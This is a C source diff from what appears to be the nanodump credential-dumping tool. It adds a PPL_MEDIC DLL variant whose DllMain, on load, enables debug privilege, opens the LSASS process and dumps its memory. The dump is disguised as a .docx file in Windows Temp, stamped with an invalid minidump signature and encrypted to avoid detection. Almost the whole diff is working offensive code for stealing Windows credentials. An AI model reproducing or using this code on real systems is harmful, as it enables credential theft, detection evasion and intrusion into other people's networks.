@@ -1022,7 +1022,7 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
 
 #include "ppl/cleanup.h"
 
-BOOL NanoDumpPPL(VOID)
+BOOL NanoDumpPPLDump(VOID)
 {
     dump_context   dc                   = { 0 };
     BOOL           bReturnValue         = FALSE;
@@ -1255,7 +1255,7 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
     switch (fdwReason)
     {
         case DLL_PROCESS_ATTACH:
-            NanoDumpPPL();
+            NanoDumpPPLDump();
             break;
         case DLL_THREAD_ATTACH:
             break;
@@ -1294,5 +1294,187 @@ void APIENTRY EAQueryAggregateEventData(VOID) {}
 void APIENTRY EaFreeAggregatedEventParameters(VOID) {}
 void APIENTRY EaDeleteAggregatedEvent(VOID) {}
 void APIENTRY EADeleteAggregateEvent(VOID) {}
+
+#elif defined(NANO) && defined(PPL_MEDIC)
+
+#include "ppl/ppl_medic.h"
+#include "ppl/ppl_medic_dll.h"
+
+BOOL NanoDumpPPLMedic(VOID)
+{
+    /******************* change this *******************/
+    LPCSTR dump_path        = "C:\\Windows\\Temp\\report.docx";
+    BOOL   use_valid_sig    = FALSE;
+    BOOL   duplicate_handle = FALSE;
+    /***************************************************/
+
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    HANDLE         hProcess             = NULL;
+    DWORD          lsass_pid            = 0;
+    BOOL           success              = TRUE;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    full_dump_path.Buffer        = wcFilePath;
+    full_dump_path.Length        = 0;
+    full_dump_path.MaximumLength = 0;
+    get_full_path(&full_dump_path, dump_path);
+
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
+
+#ifdef _M_IX86
+    if(local_is_wow64())
+    {
+        PRINT_ERR("Nanodump does not support WoW64");
+        return FALSE;
+    }
+#endif
+
+    //remove_syscall_callback_hook();
+
+    success = signal_dll_load_event(STR_IPC_WERFAULT_LOAD_EVENT_NAME);
+    if (!success)
+        goto cleanup;
+
+    if (!full_dump_path.Length)
+        goto cleanup;
+
+    success = enable_debug_priv();
+    if (!success)
+        goto cleanup;
+    
+    // if not provided, get the PID of LSASS
+    if (!lsass_pid)
+    {
+        lsass_pid = get_lsass_pid();
+        if (!lsass_pid)
+            goto cleanup;
+    }
+    else
+    {
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+    }
+
+    if (!full_dump_path.Length)
+    {
+        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
+        goto cleanup;
+    }
+
+    if (!create_file(&full_dump_path))
+        goto cleanup;
+
+    success = obtain_lsass_handle(
+        &hProcess,
+        lsass_pid,
+        duplicate_handle,
+        FALSE,
+        FALSE,
+        FALSE,
+        FALSE,
+        FALSE,
+        NULL,
+        NULL,
+        use_valid_sig,
+        dump_path,
+        FALSE,
+        FALSE,
+        NULL,
+        FALSE,
+        FALSE,
+        FALSE);
+    if (!success)
+        goto cleanup;
+
+    // set the signature
+    if (use_valid_sig)
+    {
+        DPRINT("Using a valid signature");
+        dc.Signature = MINIDUMP_SIGNATURE;
+        dc.Version = MINIDUMP_VERSION;
+        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    }
+    else
+    {
+        DPRINT("Using a invalid signature");
+        generate_invalid_sig(
+            &dc.Signature,
+            &dc.Version,
+            &dc.ImplementationVersion);
+    }
+
+    // allocate a chuck of memory to write the dump
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
+    if (!base_address)
+        goto cleanup;
+
+    dc.hProcess    = hProcess;
+    dc.BaseAddress = base_address;
+    dc.rva         = 0;
+    dc.DumpMaxSize = region_size;
+
+    success = NanoDumpWriteDump(&dc);
+    if (!success)
+        goto cleanup;
+
+    DPRINT(
+        "The dump was created successfully, final size: %d MiB",
+        (dc.rva/1024)/1024);
+
+    if (!use_valid_sig)
+    {
+        // at this point, you can encrypt or obfuscate the dump
+        encrypt_dump(
+            dc.BaseAddress,
+            dc.rva);
+    }
+
+    success = write_file(
+        &full_dump_path,
+        dc.BaseAddress,
+        dc.rva);
+
+    if (!success)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (hProcess)
+        NtClose(hProcess);
+    if (!ret_val)
+        delete_file(dump_path);
+
+    return ret_val;
+}
+
+__declspec(dllexport) BOOL APIENTRY DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved)
+{
+    UNUSED(hinstDLL);
+    UNUSED(lpReserved);
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            NanoDumpPPLMedic();
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
 
 #endif
